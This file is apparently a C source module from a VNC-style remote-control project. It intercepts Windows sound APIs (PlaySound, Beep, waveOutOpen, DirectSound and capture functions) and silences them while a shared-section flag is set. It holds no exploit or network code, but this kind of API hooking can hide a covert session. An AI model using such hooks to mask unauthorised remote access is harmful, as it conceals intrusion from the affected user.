//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
// VNC project. Version 1.9.17.3
//	
// module: sound.c
// $Revision: 186 $
// $Date: 2014-07-04 19:05:58 +0400 (Пт, 04 июл 2014) $
// description: 
//	hooks to disable sound in session

#include "vncmain.h"

#include <Mmsystem.h>
#include "sound.h"

extern VNC_SHARED_SECTION g_VncSharedSection;

EXTERN_WINMM_HOOK(PlaySoundA);
EXTERN_WINMM_HOOK(PlaySoundW);
EXTERN_WINMM_HOOK(sndPlaySoundA);
EXTERN_WINMM_HOOK(sndPlaySoundW);
EXTERN_K32_HOOK(Beep);
EXTERN_U32_HOOK(MessageBeep);
EXTERN_WINMM_HOOK(waveOutOpen);

EXTERN_DSOUND_HOOK(DirectSoundCreate);
EXTERN_DSOUND_HOOK(DirectSoundCaptureCreate);
EXTERN_DSOUND_HOOK(DirectSoundFullDuplexCreate8);
EXTERN_DSOUND_HOOK(DirectSoundFullDuplexCreate);
EXTERN_DSOUND_HOOK(DirectSoundCreate8);
EXTERN_DSOUND_HOOK(DirectSoundCaptureCreate8);

BOOL WINAPI my_PlaySoundA(LPCSTR pszSound,HMODULE hmod,DWORD fdwSound)
{
	BOOL r;
	ENTER_HOOK();
	if ( g_VncSharedSection.Data ){
		r = TRUE;
	}else{
		r = DEFINE_WINMM_PROC(PlaySoundA)(pszSound,hmod,fdwSound);
	}
	LEAVE_HOOK();
	return r;
}

BOOL WINAPI my_PlaySoundW(LPCWSTR pszSound,HMODULE hmod,DWORD fdwSound)
{
	BOOL r;
	ENTER_HOOK();
	if ( g_VncSharedSection.Data ){
		r = TRUE;
	}else{
		r = DEFINE_WINMM_PROC(PlaySoundW)(pszSound,hmod,fdwSound);
	}
	LEAVE_HOOK();
	return r;
}

BOOL WINAPI my_sndPlaySoundA(LPCSTR pszSound,UINT fuSound)
{
	BOOL r;
	ENTER_HOOK();
	if ( g_VncSharedSection.Data ){
		r = TRUE;
	}else{
		r = DEFINE_WINMM_PROC(sndPlaySoundA)(pszSound,fuSound);
	}
	LEAVE_HOOK();
	return r;
}

BOOL WINAPI my_sndPlaySoundW(LPCWSTR pszSound,UINT fuSound)
{
	BOOL r;
	ENTER_HOOK();
	if ( g_VncSharedSection.Data ){
		r = TRUE;
	}else{
		r = DEFINE_WINMM_PROC(sndPlaySoundW)(pszSound,fuSound);
	}
	LEAVE_HOOK();
	return r;
}

BOOL WINAPI my_Beep(DWORD dwFreq,DWORD dwDuration)
{
	BOOL r;
	ENTER_HOOK();
	if ( g_VncSharedSection.Data ){
		r = TRUE;
	}else{
		r = DEFINE_K32_PROC(Beep)(dwFreq,dwDuration);
	}
	LEAVE_HOOK();
	return r;
}

BOOL WINAPI my_MessageBeep(UINT uType)
{
	BOOL r;
	ENTER_HOOK();
	if ( g_VncSharedSection.Data ){
		r = TRUE;
	}else{
		r = DEFINE_U32_PROC(MessageBeep)(uType);
	}
	LEAVE_HOOK();
	return r;
}

MMRESULT WINAPI my_waveOutOpen(LPHWAVEOUT phwo,UINT_PTR uDeviceID,LPWAVEFORMATEX pwfx,DWORD_PTR dwCallback,DWORD_PTR dwCallbackInstance,DWORD fdwOpen)
{
	MMRESULT r;
	ENTER_HOOK();
	if ( g_VncSharedSection.Data ){
		r = MMSYSERR_NOMEM;
	}else{
		r = DEFINE_WINMM_PROC(waveOutOpen)(phwo,uDeviceID,pwfx,dwCallback,dwCallbackInstance,fdwOpen);
	}
	LEAVE_HOOK();
	return r;
}
//////////////////////////////////////////////////////////////////////////
// direct sound
HRESULT WINAPI my_DirectSoundCreate(
	PVOID lpGuid, 
	PVOID ppDS, 
	PVOID  pUnkOuter 
	)
{
	HRESULT r;
	ENTER_HOOK();
	if ( g_VncSharedSection.Data ){
		r = S_FALSE;
	}else{
		r = DEFINE_DSOUND_PROC(DirectSoundCreate)(lpGuid,ppDS,pUnkOuter);
	}
	LEAVE_HOOK();
	return r;
}

HRESULT WINAPI my_DirectSoundCaptureCreate( 
	PVOID lpGuid, 
	PVOID ppDS, 
	PVOID  pUnkOuter 
	)
{
	HRESULT r;
	ENTER_HOOK();
	if ( g_VncSharedSection.Data ){
		r = S_FALSE;
	}else{
		r = DEFINE_DSOUND_PROC(DirectSoundCaptureCreate)(lpGuid,ppDS,pUnkOuter);
	}
	LEAVE_HOOK();
	return r;
}

HRESULT 
WINAPI
	my_DirectSoundFullDuplexCreate8(
		PVOID pcGuidCaptureDevice,
		PVOID pcGuidRenderDevice,
		PVOID pcDSCBufferDesc,
		PVOID pcDSBufferDesc,
		HWND hWnd,
		DWORD dwLevel,
		PVOID * ppDSFD,
		PVOID * ppDSCBuffer8,
		PVOID * ppDSBuffer8,
		PVOID pUnkOuter
	)
{
	HRESULT r;
	ENTER_HOOK();
	if ( g_VncSharedSection.Data ){
		r = S_FALSE;
	}else{
		r = DEFINE_DSOUND_PROC(DirectSoundFullDuplexCreate8)(
			pcGuidCaptureDevice,
			pcGuidRenderDevice,
			pcDSCBufferDesc,
			pcDSBufferDesc,
			hWnd,
			dwLevel,
			ppDSFD,
			ppDSCBuffer8,
			ppDSBuffer8,
			pUnkOuter
			);
	}
	LEAVE_HOOK();
	return r;
}

HRESULT
WINAPI
	my_DirectSoundFullDuplexCreate(
		PVOID pcGuidCaptureDevice,
		PVOID pcGuidRenderDevice,
		PVOID pcDSCBufferDesc,
		PVOID pcDSBufferDesc,
		HWND hWnd,
		DWORD dwLevel,
		PVOID * ppDSFD,
		PVOID * ppDSCBuffer8,
		PVOID * ppDSBuffer8,
		PVOID pUnkOuter
	)
{
	HRESULT r;
	ENTER_HOOK();
	if ( g_VncSharedSection.Data ){
		r = S_FALSE;
	}else{
		r = DEFINE_DSOUND_PROC(DirectSoundFullDuplexCreate)(
			pcGuidCaptureDevice,
			pcGuidRenderDevice,
			pcDSCBufferDesc,
			pcDSBufferDesc,
			hWnd,
			dwLevel,
			ppDSFD,
			ppDSCBuffer8,
			ppDSBuffer8,
			pUnkOuter
			);
	}
	LEAVE_HOOK();
	return r;
}

HRESULT 
WINAPI
my_DirectSoundCreate8(
	PVOID lpcGuidDevice,
	PVOID * ppDS8,
	PVOID pUnkOuter
	)
{
	HRESULT r;
	ENTER_HOOK();
	if ( g_VncSharedSection.Data ){
		r = S_FALSE;
	}else{
		r = DEFINE_DSOUND_PROC(DirectSoundCreate8)(lpcGuidDevice,ppDS8,pUnkOuter);
	}
	LEAVE_HOOK();
	return r;
}

HRESULT 
WINAPI
my_DirectSoundCaptureCreate8(
	PVOID lpcGUID,
	PVOID * lplpDSC,
	PVOID pUnkOuter
	)
{
	HRESULT r;
	ENTER_HOOK();
	if ( g_VncSharedSection.Data ){
		r = S_FALSE;
	}else{
		r = DEFINE_DSOUND_PROC(DirectSoundCaptureCreate8)(lpcGUID,lplpDSC,pUnkOuter);
	}
	LEAVE_HOOK();
	return r;
}